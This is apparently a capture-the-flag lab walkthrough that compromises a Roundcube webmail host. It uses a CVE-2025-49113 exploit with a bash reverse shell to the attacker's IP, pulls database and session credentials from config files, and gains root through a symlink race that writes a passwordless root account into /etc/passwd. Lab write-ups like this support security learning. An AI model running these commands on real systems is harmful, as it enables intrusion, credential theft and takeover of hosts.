
- We are given the following credentials for the following account:
```
Username: tyler
Password: LhKL1o9Nm3X2
```

- As usual, I start with an `nmap` scan for port enumeration:
```shell
nmap -sC -sV 10.10.11.77
```
![[Pasted image 20250803133504.png]]

-  There is the port `80` open which means we have a website 
- I go to that website and I see that I am dealing with a `Roundcube Webmail` web application, where I am met with a login form and I use the given credentials to log in:![[Pasted image 20250803133716.png]]

- I am redirected to an `Inbox` page 
- In the bottom left of this page There is a question mark(`?`) button, when clicked it pops an `About` prompt showing the version of the `Roundcube Webmail`![[Pasted image 20250803134121.png]]

- On a quick search on google for a vulnerability for this version, I found what I need, that being the `CVE-2025-49113` Post-Authentication Remote Code Execution Vulnerability for versions `1.5.0` - `1.5.9` and `1.6.0` - `1.6.10` (perfect for the target exploitation)

- I also found an exploit on Github https://github.com/hakaioffsec/CVE-2025-49113-exploit
- With this exploit I can run commands on the target, so I decide to open a listener on my machine and get a reverse shell:
```shell
nc -lvnp 4444
```
```shell
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "/bin/bash -c '/bin/bash -i >& /dev/tcp/<my_IP>/4444 0>&1'"
```

- I get a shell as the `www-data` user
![[Pasted image 20250804091752.png]]

- After some investigation I found a config file `config.inc.php` for `Roundcube` in the `/var/www/html/roundcube/config` directory 
- In this file there are 2 very important things:
- A database:
```
Database name: roundcube
user: roundcube
password: RCDBPass2025
```
- A decryption key for decoding password stored in the session record:
```
rcmail-!24ByteDESkey*Str
```

- I try access the `roundcube` `mysql` database and then I enumerate the contents from the session table:
```shell
mysql -u roundcube -p
Password: RCDBPass2025

use roundcube;
select * from session;
```

- In this record I found an encoded session ![[Pasted image 20250804094827.png]]

- I use [CyberChef](https://gchq.github.io/CyberChef/) to decode the Base64 output into readable text and I get the session:
```
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

- Here I found a username: `jacob` and his password which is encrypted: `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`

- Using the decryption key found earlier I try to decrypt the password and got as result: `595m08DmwGeD`![[Pasted image 20250804095927.png]]

- I fail to `ssh` with these credentials but I achieve to `su jacob` to gain privileges as `jacob` ![[Pasted image 20250804100123.png]]

- Inspecting the home directory of `jacob` in the `/home/jacob/mail/INBOX` I found a file with the name `jacob` where I find a mail from `tyler` with credentials for `jacob` account![[Pasted image 20250804100507.png]]

- I `ssh` into `jacob` account using the password I found and also I got the user flag:
```shell
ssh jacob@10.10.11.77
Password: gY4Wr3a1evp4
```
![[Pasted image 20250804100702.png]]

## Root Escalation

- Also I check the what commands I can use with `sudo` using `sudo -l`:
![[Pasted image 20250804102809.png]]
- I find that I can use `sudo below`, I try to use that command but it does not help me much

- In the mail, where I found the password, there were also another mail telling us that we have permission to go through logs
- Going trough the `/var/log` directory I find a log directory named `below` the same as the command I can `sudo` cd below
- One `below log file` owned by root has `666` permission which allows us to write it![[Pasted image 20250804103259.png]]

- This opens the possibility for a `symlink exploit` 
- With some help I found the following bash script to attempt the `symlink overwrite` to get a root shell using a fake entry we inject into `/etc/passwd` 
```
echo 'rot::0:0:rot:/root:/bin/bash' > /tmp/fakepass
while true; do
	rm -f /var/log/below/error_root.log;
	ln -s /etc/passwd /var/log/below/error_root.log;
	cp /tmp/fakepass /var/log/below/error_root.log && break;
done
```
- In the meantime, for the `symplink exploit` to work we also use the command `sudo below` in another terminal
```shell
sudo below
```

- After that we can use `su rot` and we get `root` privileges
![[Pasted image 20250804104543.png]]
